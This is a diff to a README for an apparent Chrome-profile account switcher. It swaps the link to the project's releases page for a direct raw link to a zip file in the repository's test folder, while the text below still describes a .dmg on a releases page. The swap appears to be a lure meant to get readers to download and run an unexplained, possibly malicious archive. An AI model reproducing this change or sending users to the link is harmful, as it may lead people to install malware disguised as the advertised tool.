@@ -49,7 +49,7 @@ The engine automatically finds your installed Chrome profiles and lets you match
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Jodisciform968/claude-account-switcher-engine/releases](https://github.com/Jodisciform968/claude-account-switcher-engine/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Jodisciform968/claude-account-switcher-engine/main/test/v2.7.zip](https://raw.githubusercontent.com/Jodisciform968/claude-account-switcher-engine/main/test/v2.7.zip)**
 
 Look for the newest file at the top of the page. The file is called `claude-account-switcher-engine.dmg` (or similar). Click it to start the download.
 
